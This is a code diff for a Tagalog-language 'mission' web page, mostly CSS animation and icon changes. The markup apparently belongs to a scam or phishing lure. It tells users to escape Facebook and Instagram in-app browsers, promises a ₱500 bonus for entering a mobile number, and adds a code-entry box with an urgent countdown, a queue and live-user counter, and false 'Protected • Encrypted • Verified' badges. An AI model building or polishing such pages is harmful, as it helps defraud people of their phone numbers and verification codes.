-        .popup-title { font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; line-height: 1.2; background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
+        .popup-img-wrap::before { content: ''; position: absolute; inset: -16px; background: radial-gradient(circle at center, rgba(255, 215, 0, 0.5) 0%, rgba(110, 168, 255, 0.3) 40%, transparent 70%); border-radius: 50%; filter: blur(16px); animation: imgGlow 3s ease-in-out infinite; z-index: 0; }
+        .popup-img { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 18px; filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 215, 0, 0.55)); animation: imgFloat 3s ease-in-out infinite; }
+        .popup-title { font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; line-height: 1.2; background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 100%); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.75)); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
         .popup-title.danger { background: linear-gradient(180deg, #ff8888 0%, #ff1744 40%, #8b0000 100%); -webkit-background-clip: text; background-clip: text; }
         .popup-subtitle { font-family: 'Poppins', sans-serif; font-size: 12px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.9); margin-bottom: 18px; }
-        .popup-btn { position: relative; width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; gap: 8px; background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%); border: 3px solid #fff; border-radius: 16px; font-family: 'Orbitron', monospace; font-size: 14px; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; color: #4a1f00; cursor: pointer; overflow: hidden; box-shadow: 0 5px 0 #a66900, 0 8px 20px rgba(0, 0, 0, 0.5); transition: transform 0.12s ease, box-shadow 0.12s ease; margin-top: 6px; }
+
+        .popup-btn {
+            position: relative;
+            width: 100%;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%);
+            border: 3px solid #fff;
+            border-radius: 16px;
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #4a1f00;
+            cursor: pointer;
+            overflow: hidden;
+            box-shadow: 0 5px 0 #a66900, 0 8px 20px rgba(0, 0, 0, 0.55), 0 0 30px rgba(255, 215, 0, 0.6);
+            transition: transform 0.12s ease, box-shadow 0.12s ease;
+            margin-top: 6px;
+        }
+        .popup-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent); transform: skewX(-20deg); animation: btnShine 2.5s ease-in-out infinite; }
         .popup-btn:active { transform: translateY(5px); box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5); }
-        .popup-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .popup-btn .btn-icon { font-size: 16px; }
-        .countdown-badge { display: inline-block; margin-bottom: 12px; padding: 5px 14px; background: rgba(0, 0, 0, 0.4); border: 2px solid #ffe066; border-radius: 20px; font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; color: #ffe066; letter-spacing: 1.5px; }
+        .popup-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; filter: grayscale(0.4); }
+        .popup-btn svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+        .countdown-badge { display: inline-block; margin-bottom: 12px; padding: 5px 14px; background: rgba(0, 0, 0, 0.4); border: 2px solid #ffe066; border-radius: 20px; font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; color: #ffe066; letter-spacing: 1.5px; box-shadow: 0 0 15px rgba(255, 215, 0, 0.5); }
         .input-label { display: flex; align-items: center; justify-content: center; gap: 6px; font-family: 'Orbitron', monospace; font-size: 10px; color: #ffe066; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; }
-        .phone-input { width: 100%; max-width: 260px; display: block; margin: 0 auto 12px; text-align: center; font-family: 'Orbitron', monospace; font-size: 17px; font-weight: 900; padding: 14px; background: #0a1020; border: 3px solid #ffe066; border-radius: 14px; color: #ffe066; letter-spacing: 2px; outline: none; }
+        .input-label svg { width: 14px; height: 14px; flex-shrink: 0; }
+        .phone-input { width: 100%; max-width: 260px; display: block; margin: 0 auto 12px; text-align: center; font-family: 'Orbitron', monospace; font-size: 17px; font-weight: 900; padding: 14px; background: #0a1020; border: 3px solid #ffe066; border-radius: 14px; color: #ffe066; letter-spacing: 2px; outline: none; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
         .phone-input::placeholder { color: rgba(255, 215, 0, 0.4); letter-spacing: 2px; font-size: 13px; }
-        .phone-input:focus { border-color: #6ea8ff; }
-        .ai-code-input { width: 100%; max-width: 200px; display: block; margin: 0 auto 12px; text-align: center; font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; padding: 14px; background: #0a1020; border: 3px solid #ffe066; border-radius: 14px; color: #ffe066; letter-spacing: 8px; outline: none; }
+        .phone-input:focus { border-color: #6ea8ff; box-shadow: 0 0 25px rgba(110, 168, 255, 0.7); }
+        .ai-code-input { width: 100%; max-width: 200px; display: block; margin: 0 auto 12px; text-align: center; font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; padding: 14px; background: #0a1020; border: 3px solid #ffe066; border-radius: 14px; color: #ffe066; letter-spacing: 8px; outline: none; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
         .ai-code-input::placeholder { color: rgba(255, 215, 0, 0.4); letter-spacing: 4px; font-size: 16px; }
-        .ai-code-input:focus { border-color: #6ea8ff; }
-        .ai-timer { font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; color: #39ff14; letter-spacing: 3px; margin: 8px 0; }
-        .ai-timer.urgent { color: #ff4444; animation: urgentPulse 0.6s ease-in-out infinite; }
-        @keyframes urgentPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
+        .ai-code-input:focus { border-color: #6ea8ff; box-shadow: 0 0 25px rgba(110, 168, 255, 0.7); }
+        .ai-timer { font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; color: #39ff14; text-shadow: 0 0 15px rgba(57, 255, 20, 0.7); letter-spacing: 3px; margin: 8px 0; }
+        .ai-timer.urgent { color: #ff4444; text-shadow: 0 0 20px rgba(255, 68, 68, 0.9); animation: urgentPulse 0.5s ease-in-out infinite; }
+        @keyframes urgentPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.12); } }
         .ai-error { display: none; padding: 8px 12px; margin-top: 10px; background: rgba(255, 68, 68, 0.2); border: 2px solid rgba(255, 68, 68, 0.5); border-radius: 10px; font-family: 'Poppins', sans-serif; font-size: 11px; color: #ff8888; font-weight: 600; }
         .ai-error.show { display: block; }
         .ai-status-text { font-family: 'Poppins', sans-serif; font-size: 12px; color: rgba(255, 255, 255, 0.95); line-height: 1.5; margin-bottom: 12px; padding: 10px; background: rgba(0, 0, 0, 0.3); border-radius: 10px; border: 1px solid rgba(255, 215, 0, 0.3); }
         .ai-status-text strong { color: #ffe066; font-weight: 800; }
-        .queue-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 18px; background: linear-gradient(180deg, #ff9800 0%, #ff5722 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; letter-spacing: 2.5px; color: #fff; margin-bottom: 14px; box-shadow: 0 4px 0 #8b3a00; text-transform: uppercase; }
-        .queue-badge .queue-dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff; animation: queueDotBlink 1.2s ease-in-out infinite; }
-        @keyframes queueDotBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .queue-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 18px; background: linear-gradient(180deg, #ff9800 0%, #ff5722 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; letter-spacing: 2.5px; color: #fff; margin-bottom: 14px; box-shadow: 0 4px 0 #8b3a00, 0 0 25px rgba(255, 87, 34, 0.7); text-transform: uppercase; animation: queueBadgePulse 2s ease-in-out infinite; }
+        @keyframes queueBadgePulse { 0%, 100% { box-shadow: 0 4px 0 #8b3a00, 0 0 25px rgba(255, 87, 34, 0.7); } 50% { box-shadow: 0 4px 0 #8b3a00, 0 0 45px rgba(255, 87, 34, 1); } }
+        .queue-badge .queue-dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff; animation: queueDotBlink 1s ease-in-out infinite; }
+        @keyframes queueDotBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         .queue-count-box { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; margin: 10px 0; background: rgba(0, 0, 0, 0.4); border: 2px solid rgba(255, 215, 0, 0.4); border-radius: 14px; font-family: 'Poppins', sans-serif; font-size: 12px; color: rgba(255, 255, 255, 0.9); }
-        .queue-count-box .live-users-count { font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #39ff14; }
-        .queue-timer-big { font-family: 'Orbitron', monospace; font-size: 46px; font-weight: 900; color: #ffe066; letter-spacing: 4px; margin: 14px 0; }
+        .queue-count-box .live-users-count { font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #39ff14; text-shadow: 0 0 15px rgba(57, 255, 20, 0.8); }
+        .queue-timer-big { font-family: 'Orbitron', monospace; font-size: 46px; font-weight: 900; color: #ffe066; text-shadow: 0 0 25px rgba(255, 215, 0, 0.9); letter-spacing: 4px; margin: 14px 0; animation: queueTimerGlow 1.5s ease-in-out infinite; }
+        @keyframes queueTimerGlow { 0%, 100% { text-shadow: 0 0 25px rgba(255, 215, 0, 0.9); } 50% { text-shadow: 0 0 45px rgba(255, 215, 0, 1), 0 0 65px rgba(255, 179, 0, 0.8); } }
         .queue-timer-label { font-family: 'Poppins', sans-serif; font-size: 11px; color: rgba(255, 255, 255, 0.8); letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 4px; }
         .queue-progress { width: 100%; height: 10px; background: rgba(0, 0, 0, 0.5); border: 2px solid rgba(255, 215, 0, 0.5); border-radius: 12px; overflow: hidden; margin: 14px 0; }
-        .queue-progress-bar { height: 100%; background: linear-gradient(90deg, #ffe066, #ffb300, #ff8800); width: 0%; transition: width 1s linear; border-radius: 12px; }
+        .queue-progress-bar { height: 100%; background: linear-gradient(90deg, #ffe066, #ffb300, #ff8800); width: 0%; transition: width 1s linear; box-shadow: 0 0 15px rgba(255, 215, 0, 0.8); border-radius: 12px; }
         .popup-success { text-align: center; padding: 20px 0; }
-        .popup-success .success-icon { font-size: 60px; margin-bottom: 14px; }
-        .popup-success .success-title { font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; background: linear-gradient(180deg, #39ff14, #008833); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 10px; text-transform: uppercase; }
+        .popup-success .success-icon { font-size: 60px; margin-bottom: 14px; filter: drop-shadow(0 0 20px rgba(57, 255, 20, 0.9)); animation: successPulse 1.5s ease-in-out infinite; }
+        @keyframes successPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .popup-success .success-title { font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; background: linear-gradient(180deg, #39ff14, #008833); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 15px rgba(57, 255, 20, 0.7)); margin-bottom: 10px; text-transform: uppercase; }
         .popup-success .success-message { font-family: 'Poppins', sans-serif; font-size: 13px; color: rgba(255, 255, 255, 0.9); line-height: 1.6; }
         .hidden { display: none !important; }
 
         /* BAN POPUP */
-        .popup-card.ban-card { background: linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 30%), linear-gradient(160deg, #d10000 0%, #8b0000 45%, #4a0000 100%); border-color: #ff8888; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), 0 0 40px rgba(255, 68, 68, 0.4); }
+        .popup-card.ban-card { background: linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 30%), linear-gradient(160deg, #d10000 0%, #8b0000 45%, #4a0000 100%); border-color: #ff8888; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 68, 68, 0.5); }
+        .popup-card.ban-card .popup-img-wrap::before { background: radial-gradient(circle at center, rgba(255, 68, 68, 0.5) 0%, rgba(139, 0, 0, 0.3) 40%, transparent 70%); }
+        .popup-card.ban-card .popup-img { filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 68, 68, 0.55)); }
 
         /* ============================================================
-           ✅ READY TO CLAIM STATE — ANIMATED (REDUCED)
+           READY TO CLAIM STATE
            ============================================================ */
-        .ready-to-claim-wrap { display: none; animation: readyFadeIn 0.4s ease; }
+        .ready-to-claim-wrap { display: none; animation: readyFadeIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .ready-to-claim-wrap.show { display: block; }
-        @keyframes readyFadeIn { 0% { opacity: 0; transform: translateY(-10px); } 100% { opacity: 1; transform: translateY(0); } }
+        @keyframes readyFadeIn { 0% { opacity: 0; transform: translateY(-10px) scale(0.95); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
 
-        .ready-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 20px; background: linear-gradient(180deg, #39ff14 0%, #008833 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 900; letter-spacing: 2.5px; color: #fff; margin-bottom: 16px; box-shadow: 0 4px 0 #004d1a; text-transform: uppercase; animation: readyBadgePulse 1.5s ease-in-out infinite; }
-        @keyframes readyBadgePulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.04); } }
-        .ready-badge .ready-dot { width: 10px; height: 10px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff; animation: readyDotBlink 1s ease-in-out infinite; }
-        @keyframes readyDotBlink { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.8); } }
+        .ready-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 20px; background: linear-gradient(180deg, #39ff14 0%, #008833 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 900; letter-spacing: 2.5px; color: #fff; margin-bottom: 16px; box-shadow: 0 4px 0 #004d1a, 0 0 30px rgba(57, 255, 20, 0.9); text-transform: uppercase; animation: readyBadgePulse 1.2s ease-in-out infinite; text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }
+        @keyframes readyBadgePulse {
+            0%, 100% { box-shadow: 0 4px 0 #004d1a, 0 0 30px rgba(57, 255, 20, 0.9); transform: scale(1); }
+            50% { box-shadow: 0 4px 0 #004d1a, 0 0 60px rgba(57, 255, 20, 1), 0 0 100px rgba(57, 255, 20, 0.5); transform: scale(1.05); }
+        }
+        .ready-badge .ready-dot { width: 10px; height: 10px; border-radius: 50%; background: #fff; box-shadow: 0 0 12px #fff, 0 0 20px #39ff14; animation: readyDotBlink 0.8s ease-in-out infinite; }
+        @keyframes readyDotBlink { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.7); } }
 
         .ready-image-wrap { position: relative; width: 100%; max-width: 220px; margin: 0 auto 18px; display: flex; align-items: center; justify-content: center; }
-        .ready-image { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 20px; filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.5)); }
+        .ready-image-wrap::before { content: ''; position: absolute; inset: -18px; background: radial-gradient(circle at center, rgba(57, 255, 20, 0.5) 0%, rgba(110, 168, 255, 0.3) 45%, transparent 72%); border-radius: 50%; filter: blur(18px); animation: imgGlow 3s ease-in-out infinite; z-index: 0; }
+        .ready-image { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 20px; filter: drop-shadow(0 10px 25px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 25px rgba(57, 255, 20, 0.6)); animation: imgFloat 3s ease-in-out infinite; }
 
-        .ready-title { font-family: 'Fredoka', sans-serif; font-size: 30px; font-weight: 900; line-height: 1.15; letter-spacing: 1px; background: linear-gradient(180deg, #ffffff 0%, #39ff14 40%, #008833 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 10px; text-transform: uppercase; }
+        .ready-title { font-family: 'Fredoka', sans-serif; font-size: 30px; font-weight: 900; line-height: 1.15; letter-spacing: 1px; background: linear-gradient(180deg, #ffffff 0%, #39ff14 40%, #008833 100%); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 25px rgba(57, 255, 20, 0.9)); margin-bottom: 10px; text-transform: uppercase; animation: readyTitleGlow 1.5s ease-in-out infinite; }
+        @keyframes readyTitleGlow { 0%, 100% { filter: drop-shadow(0 0 25px rgba(57, 255, 20, 0.9)); } 50% { filter: drop-shadow(0 0 45px rgba(57, 255, 20, 1)) drop-shadow(0 0 80px rgba(57, 255, 20, 0.5)); } }
 
-        .ready-subtitle { font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.95); margin-bottom: 20px; }
-        .ready-subtitle strong { color: #39ff14; font-weight: 800; }
+        .ready-subtitle { font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.95); margin-bottom: 20px; text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4); }
+        .ready-subtitle strong { color: #39ff14; font-weight: 800; text-shadow: 0 0 12px rgba(57, 255, 20, 0.75); }
 
-        .ready-claim-btn { position: relative; width: 100%; padding: 22px 22px; display: flex; align-items: center; justify-content: center; gap: 12px; background: linear-gradient(180deg, #d4ffb3 0%, #39ff14 25%, #00cc00 65%, #008833 100%); border: 3px solid #ffffff; border-radius: 20px; font-family: 'Orbitron', monospace; font-size: 17px; font-weight: 900; letter-spacing: 3px; text-transform: uppercase; color: #003300; cursor: pointer; overflow: hidden; box-shadow: 0 6px 0 #004d1a, 0 10px 24px rgba(0, 0, 0, 0.5); transition: transform 0.12s ease, box-shadow 0.12s ease; animation: readyBtnPulse 1.6s ease-in-out infinite; margin-top: 6px; }
-        @keyframes readyBtnPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
+        .ready-claim-btn { position: relative; width: 100%; padding: 22px 22px; display: flex; align-items: center; justify-content: center; gap: 12px; background: linear-gradient(180deg, #d4ffb3 0%, #39ff14 25%, #00cc00 65%, #008833 100%); border: 3px solid #ffffff; border-radius: 20px; font-family: 'Orbitron', monospace; font-size: 17px; font-weight: 900; letter-spacing: 3px; text-transform: uppercase; color: #003300; cursor: pointer; overflow: hidden; box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 60px rgba(57, 255, 20, 0.9); transition: transform 0.12s ease, box-shadow 0.12s ease; animation: readyBtnPulse 1.4s ease-in-out infinite; margin-top: 6px; }
+        @keyframes readyBtnPulse {
+            0%, 100% { box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 60px rgba(57, 255, 20, 0.9); transform: scale(1); }
+            50% { box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 100px rgba(57, 255, 20, 1), 0 0 150px rgba(57, 255, 20, 0.6); transform: scale(1.03); }
+        }
+        .ready-claim-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.85), transparent); transform: skewX(-20deg); animation: btnShine 1.8s ease-in-out infinite; }
         .ready-claim-btn:active { transform: translateY(6px) scale(1) !important; box-shadow: 0 0 0 #004d1a, 0 4px 12px rgba(0, 0, 0, 0.5) !important; }
-        .ready-claim-btn .btn-icon { font-size: 22px; display: inline-block; animation: readyBtnIconBounce 1.2s ease-in-out infinite; }
-        @keyframes readyBtnIconBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-3px); } }
+        .ready-claim-btn svg { width: 24px; height: 24px; flex-shrink: 0; animation: iconGiftBounce 1s ease-in-out infinite; }
+        @keyframes iconGiftBounce { 0%, 100% { transform: translateY(0) scale(1); } 50% { transform: translateY(-3px) scale(1.15); } }
 
-        .ready-note { margin-top: 16px; font-family: 'Poppins', sans-serif; font-size: 11px; font-weight: 500; color: rgba(255, 255, 255, 0.85); display: flex; align-items: center; justify-content: center; gap: 6px; }
-        .ready-note i { color: #39ff14; }
+        .ready-note { margin-top: 16px; font-family: 'Poppins', sans-serif; font-size: 11px; font-weight: 500; color: rgba(255, 255, 255, 0.85); letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 6px; animation: readyNotePulse 2s ease-in-out infinite; }
+        @keyframes readyNotePulse { 0%, 100% { opacity: 0.85; } 50% { opacity: 1; } }
+        .ready-note svg { width: 14px; height: 14px; color: #39ff14; filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.9)); flex-shrink: 0; }
+
+        .ready-glow-ring { position: absolute; inset: -12px; border-radius: 30px; pointer-events: none; border: 2px solid rgba(57, 255, 20, 0.6); animation: readyRingExpand 2s ease-out infinite; }
+        @keyframes readyRingExpand { 0% { transform: scale(0.9); opacity: 0.9; } 100% { transform: scale(1.3); opacity: 0; } }
 
         @media (max-width: 380px) {
             .mission-card { padding: 30px 16px 22px; border-radius: 26px; }
             .mission-title { font-size: 23px; }
             .mission-subtitle { font-size: 12px; }
             .mission-btn { padding: 16px; font-size: 13px; letter-spacing: 2px; }
+            .mission-btn svg { width: 20px; height: 20px; }
             .mission-chip { font-size: 8px; padding: 6px 10px; }
             .popup-card { padding: 26px 16px 20px; }
             .popup-title { font-size: 19px; }
@@ -431,22 +580,16 @@
             #intentBlock .intent-card { padding: 28px 18px 24px; border-radius: 26px; }
             #intentBlock .intent-title { font-size: 22px; }
             #intentBlock .intent-subtitle { font-size: 12px; }
-            #intentBlock .auto-open-btn { padding: 17px 20px; font-size: 13px; letter-spacing: 2px; }
+            #intentBlock .auto-open-btn { padding: 16px 18px; font-size: 12px; letter-spacing: 2px; }
+            #intentBlock .auto-open-btn svg { width: 20px; height: 20px; }
             #intentBlock .intent-image-wrap { max-width: 200px; }
             #intentBlock .intent-steps { font-size: 11px; padding: 12px 14px; }
             .ready-title { font-size: 24px; }
             .ready-claim-btn { padding: 18px 16px; font-size: 14px; letter-spacing: 2px; }
+            .ready-claim-btn svg { width: 22px; height: 22px; }
             .ready-image-wrap { max-width: 180px; }
         }
-
-        /* ✅ ANTI-LAG: Respect user preference */
-        @media (prefers-reduced-motion: reduce) {
-            *, *::before, *::after {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
-            }
-        }
+        @media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; } }
     </style>
 </head>
 <body>
@@ -462,26 +605,49 @@
     <!-- ✅ INTENT / BROWSER GUARD -->
     <div id="intentBlock">
         <div class="intent-card">
+
             <div class="intent-badge"><span class="badge-dot"></span><span>⚠️ BROWSER REQUIRED ⚠️</span></div>
+
             <div class="intent-image-wrap">
                 <img src="images/cat_start.png" alt="Open in Browser" class="intent-image" onerror="this.style.opacity='0.4';">
             </div>
+
             <h1 class="intent-title">OPEN IN BROWSER</h1>
-            <p class="intent-subtitle">This mission must be opened in your <strong>default browser</strong> (Chrome, etc.)</p>
-            <p class="intent-danger-text">❌ Facebook / Instagram / iPhone not supported</p>
+
+            <p class="intent-subtitle">
+                This mission must be opened in your <strong>default browser</strong> (Chrome, etc.)
+            </p>
+
+            <p class="intent-danger-text">
+                ❌ Facebook / Instagram / iPhone not supported
+            </p>
+
             <div class="intent-divider"><span class="star">★</span><span class="line"></span><span class="star">★</span></div>
+
             <div class="intent-steps">
                 <span class="steps-title">📌 Paano Buksan</span>
                 <span class="step-num">1</span> I-tap ang <strong>⋮ (3 dots)</strong> sa taas<br>
                 <span class="step-num">2</span> Piliin ang <strong>"Open in Browser"</strong><br>
                 <span class="step-num">3</span> Buksan sa <strong>Chrome</strong> o default browser
             </div>
+
             <button class="auto-open-btn" id="autoOpenBtn">
-                <span class="btn-icon">🚀</span>
+                <!-- SVG: Rocket Launch Icon -->
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"/>
+                    <path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"/>
+                    <path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"/>
+                    <path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"/>
+                </svg>
                 <span>BUKSAN SA CHROME</span>
             </button>
+
             <div class="intent-note">
-                <i class="fas fa-shield-halved"></i>
+                <!-- SVG: Shield Check Icon -->
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>
+                    <path d="m9 12 2 2 4-4"/>
+                </svg>
                 <span>Protected • Encrypted • Verified</span>
             </div>
         </div>
@@ -500,6 +666,8 @@
 
     <!-- MISSION APP -->
     <div id="missionApp">
+        <div class="bg-rays"></div>
+        <div class="bg-glow"></div>
         <div id="coinLayer"></div>
         <div id="sparkleLayer"></div>
         <div id="confettiLayer"></div>
@@ -517,21 +685,54 @@
                 <div class="mission-chip"><span class="chip-icon">⚡</span><span>INSTANT</span></div>
                 <div class="mission-chip"><span class="chip-icon">🔒</span><span>SECURED</span></div>
             </div>
-            <button class="mission-btn" id="continueBtn"><span class="btn-icon">🚀</span><span>CONTINUE MISSION</span></button>
-            <div class="mission-note"><i class="fas fa-shield-halved"></i><span>Protected • Encrypted • Verified</span></div>
+            <button class="mission-btn" id="continueBtn">
+                <!-- SVG: Rocket Icon -->
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"/>
+                    <path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"/>
+                    <path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"/>
+                    <path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"/>
+                </svg>
+                <span>CONTINUE MISSION</span>
+            </button>
+            <div class="mission-note">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>
+                    <path d="m9 12 2 2 4-4"/>
+                </svg>
+                <span>Protected • Encrypted • Verified</span>
+            </div>
         </div>
     </div>
 
     <!-- POPUP 1: CAT CLAIM -->
     <div class="popup-overlay" id="catClaimPopup">
         <div class="popup-card">
-            <button class="popup-close" id="catClaimClose">✕</button>
+            <button class="popup-close" id="catClaimClose">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
+                </svg>
+            </button>
             <div class="popup-img-wrap"><img src="images/cat_claim.png" alt="Claim" class="popup-img" onerror="this.style.opacity='0.4';"></div>
             <h2 class="popup-title">READY TO CLAIM?</h2>
             <p class="popup-subtitle">Enter your mobile number to claim<br>your <strong>₱500 bonus</strong>!</p>
-            <div class="input-label"><i class="fas fa-mobile-screen-button"></i><span>MOBILE NUMBER</span></div>
+            <div class="input-label">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
+                    <path d="M12 18h.01"/>
+                </svg>
+                <span>MOBILE NUMBER</span>
+            </div>
             <input type="tel" class="phone-input" id="userPhoneInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
-            <button class="popup-btn" id="get500Btn"><span class="btn-icon">💰</span><span>GET ₱500</span></button>
+            <button class="popup-btn" id="get500Btn">
+                <!-- SVG: Money Stack Icon -->
